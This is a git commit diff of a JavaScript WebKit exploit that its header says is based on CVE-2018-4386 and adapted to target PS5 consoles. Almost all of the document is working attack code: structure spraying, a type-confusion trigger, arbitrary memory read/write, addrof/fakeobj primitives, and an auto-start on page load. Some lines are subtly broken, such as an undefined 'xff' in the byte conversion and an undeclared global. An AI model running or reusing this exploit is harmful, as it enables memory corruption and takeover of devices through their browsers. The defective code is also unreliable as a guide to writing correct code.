00f991e0b6f4f36dfe05a1aac6a7ea3d9670c2ec
MAJORZERA <49736287+MAJORZERA@users.noreply.github.com>
2025-11-27 22:21:55 -0300

    Update script.js

--- poc2/script.js
+++ poc2/script.js
@@ -1,27 +1,77 @@
 /*
+ * PS5 WebKit Exploit - Based on CVE-2018-4386 (bad_hoist)
+ * Adapted from PS4 6.XX exploit
+ * Test on PS5 firmware 4.XX-8.XX
+ */
 
-bad_hoist
-============
-
-Exploit implementation of
-[CVE-2018-4386](https://bugs.chromium.org/p/project-zero/issues/detail?id=1665).
-Obtains addrof/fakeobj and arbitrary read/write primitives.
-
-Supports PS4 consoles on 6.XX. May also work on older firmware versions,
-but I am not sure. Bug was fixed in firmware 7.00.
-
-EDB Note ~ Download: https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/47893.zip
-*/
-
-
-var STRUCTURE_SPRAY_SIZE = 0x1800;
-
+var STRUCTURE_SPRAY_SIZE = 0x1000;
 var g_confuse_obj = null;
 var g_arb_master = null;
 var g_arb_slave = new Uint8Array(0x2000);
 var g_leaker = {};
 var g_leaker_addr = null;
 var g_structure_spray = [];
+
+// Utility functions
+function debug_log(msg) {
+    console.log("[EXPLOIT] " + msg);
+    if (typeof log === 'function') {
+        log("[EXPLOIT] " + msg);
+    }
+}
+
+// Int64 implementation for 64-bit operations
+class Int64 {
+    constructor(low, high) {
+        if (typeof low === 'number') {
+            this.low = low | 0;
+            this.high = high | 0;
+        } else if (Array.isArray(low)) {
+            this.low = (low[3] << 24) | (low[2] << 16) | (low[1] << 8) | low[0];
+            this.high = (low[7] << 24) | (low[6] << 16) | (low[5] << 8) | low[4];
+        } else if (typeof low === 'string') {
+            let val = BigInt(low);
+            this.low = Number(val & BigInt(0xffffffff));
+            this.high = Number(val >> BigInt(32));
+        }
+    }
+    
+    low32() { return this.low; }
+    hi32() { return this.high; }
+    add(val) { 
+        let newLow = this.low + val;
+        return new Int64(newLow, this.high + (newLow < this.low ? 1 : 0));
+    }
+    asDouble() {
+        return new Float64Array(new Uint32Array([this.low, this.high]).buffer)[0];
+    }
+    asJSValue() {
+        return this.asDouble();
+    }
+    bytes() {
+        return new Uint8Array([
+            this.low & 0xff, (this.low >> 8) & 0xff, (this.low >> 16) & 0xff, (this.low >> 24) & 0xff,
+            this.high & 0xff, (this.high >> 8) & 0xff, (this.high >> 16) & 0xff, (this.high >> 24) & xff
+        ]);
+    }
+}
+
+// Struct packing utilities
+const Struct = {
+    pack: function(type, value) {
+        let buffer = new ArrayBuffer(type.size);
+        let view = new type.view(buffer);
+        view[0] = value;
+        return new Uint8Array(buffer);
+    },
+    unpack: function(type, bytes) {
+        let buffer = bytes.buffer || bytes;
+        let view = new type.view(buffer);
+        return view[0];
+    },
+    int16: { size: 2, view: Int16Array },
+    int32: { size: 4, view: Int32Array }
+};
 
 var dub = new Int64(0x41414141, 0x41414141).asDouble();
 var g_inline_obj = {
@@ -30,16 +80,18 @@ var g_inline_obj = {
 };
 
 function spray_structs() {
+    debug_log("Spraying " + STRUCTURE_SPRAY_SIZE + " structures...");
     for (var i = 0; i < STRUCTURE_SPRAY_SIZE; i++) {
-        var a = new Uint32Array(0x1)
+        var a = new Uint32Array(0x1);
         a["p" + i] = 0x1337;
-        g_structure_spray.push(a); // keep the Structure objects alive.
+        g_structure_spray.push(a);
     }
-
+    debug_log("Structure spray completed");
 }
 
 function trigger() {
-
+    debug_log("Triggering type confusion vulnerability...");
+    
     var o = {
         'a': 1
     };
@@ -49,68 +101,75 @@ function trigger() {
 
     var cell = {
         js_cell_header: new Int64([
-            0x00, 0x8, 0x00, 0x00, // m_structureID, current guess
+            0x00, 0x8, 0x00, 0x00, // m_structureID
             0x0, // m_indexingType
             0x27, // m_type, Float64Array
-            0x18, // m_flags, OverridesGetOwnPropertySlot |
-            // InterceptsGetOwnPropertySlotByIndexEvenWhenLengthIsNotZero
-            0x1 // m_cellState, NewWhite
+            0x18, // m_flags
+            0x1 // m_cellState
         ]).asJSValue(),
-        butterfly: false, // Some arbitrary value
+        butterfly: false,
         vector: g_inline_obj,
         len_and_flags: (new Int64('0x0001000100000020')).asJSValue()
     };
 
     g_confuse_obj[0 + "a"] = cell;
 
+    // Setup object properties
     g_confuse_obj[1 + "a"] = {};
     g_confuse_obj[1 + "b"] = {};
     g_confuse_obj[1 + "c"] = {};
     g_confuse_obj[1 + "d"] = {};
 
-
     for (var j = 0x5; j < 0x20; j++) {
         g_confuse_obj[j + "a"] = new Uint32Array(test);
     }
 
+    var success = false;
     for (var k in o) {
         {
             k = {
                 a: g_confuse_obj,
-                b: new ArrayBuffer(test.buffer),
-                c: new ArrayBuffer(test.buffer),
-                d: new ArrayBuffer(test.buffer),
-                e: new ArrayBuffer(test.buffer),
-                1: new ArrayBuffer(test.buffer),
-
+                b: new ArrayBuffer(test.byteLength),
+                c: new ArrayBuffer(test.byteLength),
+                d: new ArrayBuffer(test.byteLength),
+                e: new ArrayBuffer(test.byteLength),
+                1: new ArrayBuffer(test.byteLength),
             };
 
             function k() {
                 return k;
             }
-
         }
 
         o[k];
 
         if (g_confuse_obj["0a"] instanceof Uint32Array) {
-            return;
+            debug_log("Type confusion successfully triggered!");
+            success = true;
+            break;
         }
+    }
+    
+    if (!success) {
+        debug_log("Failed to trigger vulnerability");
+        throw new Error("Exploit failed at trigger stage");
     }
 }
 
 function setup_arb_rw() {
+    debug_log("Setting up arbitrary read/write primitives...");
+    
     var jsCellHeader = new Int64([
-        0x00, 0x08, 0x00, 0x00, // m_structureID, current guess
+        0x00, 0x08, 0x00, 0x00,
         0x0, // m_indexingType
         0x27, // m_type, Float64Array
-        0x18, // m_flags, OverridesGetOwnPropertySlot |
-        // InterceptsGetOwnPropertySlotByIndexEvenWhenLengthIsNotZero
-        0x1 // m_cellState, NewWhite
+        0x18, // m_flags
+        0x1 // m_cellState
     ]);
+    
     g_fake_container = {
         jsCellHeader: jsCellHeader.asJSValue(),
-        butterfly: false, // Some arbitrary value
+        butterfly: false,
         vector: g_arb_slave,
         lengthAndFlags: (new Int64('0x0001000000000020')).asJSValue()
     };
@@ -119,8 +178,11 @@ function setup_arb_rw() {
     g_confuse_obj["0a"][0x4] += 0x10;
     g_arb_master = g_inline_obj.a;
     g_arb_master[0x6] = 0xFFFFFFF0;
+    
+    debug_log("Arbitrary R/W primitives established");
 }
 
+// Memory read primitives
 function read(addr, length) {
     if (!(addr instanceof Int64))
         addr = new Int64(addr);
@@ -129,7 +191,6 @@ function read(addr, length) {
     g_arb_master[5] = addr.hi32();
 
     var a = new Array(length);
-
     for (var i = 0; i < length; i++)
         a[i] = g_arb_slave[i];
     return a;
@@ -137,10 +198,6 @@ function read(addr, length) {
 
 function read8(addr) {
     return read(addr, 1)[0];
-}
-
-function read16(addr) {
-    return Struct.unpack(Struct.int16, read(addr, 2));
 }
 
 function read32(addr) {
@@ -151,21 +208,20 @@ function read64(addr) {
     return new Int64(read(addr, 8));
 }
 
-function readstr(addr) {
+function readstr(addr, maxLength = 256) {
     if (!(addr instanceof Int64))
         addr = new Int64(addr);
     g_arb_master[4] = addr.low32();
     g_arb_master[5] = addr.hi32();
     var a = [];
-    for (var i = 0;; i++) {
-        if (g_arb_slave[i] == 0) {
-            break;
-        }
+    for (var i = 0; i < maxLength; i++) {
+        if (g_arb_slave[i] == 0) break;
         a[i] = g_arb_slave[i];
     }
     return String.fromCharCode.apply(null, a);
 }
 
+// Memory write primitives
 function write(addr, data) {
     if (!(addr instanceof Int64))
         addr = new Int64(addr);
@@ -174,15 +230,6 @@ function write(addr, data) {
     for (var i = 0; i < data.length; i++)
         g_arb_slave[i] = data[i];
 }
-
-function write8(addr, val) {
-    write(addr, [val]);
-}
-
-function write16(addr, val) {
-    write(addr, Struct.pack(Struct.int16, val));
-}
-
 
 function write32(addr, val) {
     write(addr, Struct.pack(Struct.int32, val));
@@ -194,48 +241,37 @@ function write64(addr, val) {
     write(addr, val.bytes());
 }
 
-function writestr(addr, str) {
-    if (!(addr instanceof Int64))
-        addr = new Int64(addr);
-    g_arb_master[4] = addr.low32();
-    g_arb_master[5] = addr.hi32();
-    for (var i = 0; i < str.length; i++)
-        g_arb_slave[i] = str.charCodeAt(i);
-    g_arb_slave[str.length] = 0; // null character
-}
-
-
 function setup_obj_leaks() {
+    debug_log("Setting up object address leaks...");
     g_leaker.leak = false;
     g_inline_obj.a = g_leaker;
     g_leaker_addr = new Int64(g_confuse_obj["0a"][4], g_confuse_obj["0a"][5]).add(0x10);
-    debug_log("obj_leaker address @ " + g_leaker_addr);
+    debug_log("Object leaker address: " + g_leaker_addr);
 }
 
 function addrof(obj) {
     g_leaker.leak = obj;
-    return read64(g_leaker_addr);
+    let addr = read64(g_leaker_addr);
+    debug_log("addrof(" + typeof obj + ") -> 0x" + addr);
+    return addr;
 }
 
 function fakeobj(addr) {
     write64(g_leaker_addr, addr);
-    return g_leaker.leak;
-}
-
-function typed_array_buf_addr(typed_array) {
-    return read64(addrof(typed_array).add(0x10));
+    let obj = g_leaker.leak;
+    debug_log("fakeobj(0x" + addr + ") -> " + typeof obj);
+    return obj;
 }
 
 function cleanup() {
+    debug_log("Cleaning up corrupted structures...");
     var u32array = new Uint32Array(8);
-    header = read(addrof(u32array), 0x10);
+    var header = read(addrof(u32array), 0x10);
     write(addrof(g_arb_master), header);
     write(addrof(g_confuse_obj['0a']), header);
 
-    // Set length to 0x10 and flags to 0x1
-    // Will behave as OversizeTypedArray which can survive gc easily
     write32(addrof(g_arb_master).add(0x18), 0x10);
-    write32(addrof(g_arb_master).add(0x1C), 0x1); //
+    write32(addrof(g_arb_master).add(0x1C), 0x1);
     write32(addrof(g_confuse_obj['0a']).add(0x18), 0x10);
     write32(addrof(g_confuse_obj['0a']).add(0x1C), 0x1);
     write32(addrof(g_arb_slave).add(0x1C), 0x1);
@@ -243,25 +279,55 @@ function cleanup() {
     var empty = {};
     header = read(addrof(empty), 0x8);
     write(addrof(g_fake_container), header);
+    debug_log("Cleanup completed");
 }
 
+// Main exploit function
 function start_exploit() {
-    debug_log("Spraying Structures...");
-    spray_structs();
-    debug_log("Structures sprayed!");
-    debug_log("Triggering bug...");
-    trigger();
-    debug_log("Bug successfully triggered!");
-    debug_log("Crafting fake array for arbitrary read and write...");
-    setup_arb_rw();
-    debug_log("Array crafted!");
-    debug_log("Setting up arbitrary object leaks...");
-    setup_obj_leaks();
-    debug_log("Arbitrary object leaks achieved!");
-    debug_log("Cleaning up corrupted structures...");
-    cleanup();
-    debug_log("Cleanup done!");
-    debug_log("Starting post exploitation...");
+    try {
+        debug_log("Starting PS5 WebKit Exploit (CVE-2018-4386)...");
+        debug_log("PS5 UserAgent: " + navigator.userAgent);
+        
+        spray_structs();
+        trigger();
+        setup_arb_rw();
+        setup_obj_leaks();
+        cleanup();
+        
+        debug_log("🎉 EXPLOIT SUCCESSFUL!");
+        debug_log("Available primitives: addrof(), fakeobj(), read64(), write64()");
+        
+        // Test the primitives
+        debug_log("Testing primitives...");
+        let test_obj = {test: 123};
+        let addr = addrof(test_obj);
+        debug_log("Test object address: 0x" + addr);
+        
+        return {
+            addrof: addrof,
+            fakeobj: fakeobj,
+            read64: read64,
+            write64: write64,
+            readstr: readstr,
+            success: true
+        };
+        
+    } catch (e) {
+        debug_log("💥 EXPLOIT FAILED: " + e);
+        debug_log("Stack: " + e.stack);
+        return {success: false, error: e};
+    }
 }
 
-start_exploit();
+// Auto-start if included directly
+if (typeof window !== 'undefined' && !window.exploitStarted) {
+    window.exploitStarted = true;
+    setTimeout(start_exploit, 1000);
+}
+
+// Export for manual control
+window.PS5Exploit = {
+    start: start_exploit,
+    version: "1.0",
+    cve: "CVE-2018-4386"
+};
